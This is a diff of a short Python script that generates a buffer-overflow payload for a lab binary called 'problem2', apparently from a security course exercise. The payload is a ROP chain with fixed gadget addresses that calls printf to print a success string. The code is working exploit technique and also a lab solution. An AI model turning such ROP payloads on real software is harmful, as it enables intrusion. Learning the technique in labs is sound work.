@@ -1,34 +1,31 @@
 #!/usr/bin/env python3
 """
-Generate ans2.txt payload for Problem2.
+Problem2 Payload Generator
 
-Usage:
-  python3 scripts/generate_ans2.py
+Generate ans2.txt for ROP exploit in problem2 (NX protected).
+Creates a ROP chain that calls printf to display "Yes!I like ICS!".
 
-Writes a ROP-style payload used in the lab. This script is explicit about
-addresses so you can inspect and adapt it.
+ROP Chain:
+- pop rdi; ret gadget (0x4012c7)
+- address of string "Yes!I like ICS!\n" (0x40203b)
+- ret gadget for stack alignment (0x4012c8)
+- printf@plt (0x4010d0)
+- exit@plt (0x401120)
 """
+
 from pathlib import Path
 
-OUT_PATH = Path(__file__).resolve().parents[1] / "ans2.txt"
+# Build ROP chain
+payload = b"A" * 16  # Padding to overflow buffer
+payload += (0x4012c7).to_bytes(8, "little")  # pop rdi; ret
+payload += (0x40203b).to_bytes(8, "little")  # address of success string
+payload += (0x4012c8).to_bytes(8, "little")  # ret (stack alignment)
+payload += (0x4010d0).to_bytes(8, "little")  # printf@plt
+payload += (0x401120).to_bytes(8, "little")  # exit@plt
 
-def main():
-    padding = b"A" * 16
-    pop_rdi = (0x4012c7).to_bytes(8, "little")
-    rodata_ptr = (0x40203b).to_bytes(8, "little")
-    ret_gadget = (0x4012c8).to_bytes(8, "little")
-    printf_plt = (0x4010d0).to_bytes(8, "little")
-    exit_plt = (0x401120).to_bytes(8, "little")
+# Pad to 56 bytes (memcpy copies 0x38 bytes)
+payload += b"B" * (56 - len(payload))
 
-    payload = padding + pop_rdi + rodata_ptr + ret_gadget + printf_plt + exit_plt
-    # memcpy in target copies 0x38 (56) bytes; pad to that length if needed
-    if len(payload) < 56:
-        payload += b"B" * (56 - len(payload))
-
-    OUT_PATH.write_bytes(payload)
-    print(f"wrote {OUT_PATH} ({len(payload)} bytes)")
-
-if __name__ == "__main__":
-    main()
-
+# Write to ans2.txt
+Path(__file__).resolve().parents[1].joinpath("ans2.txt").write_bytes(payload)
 
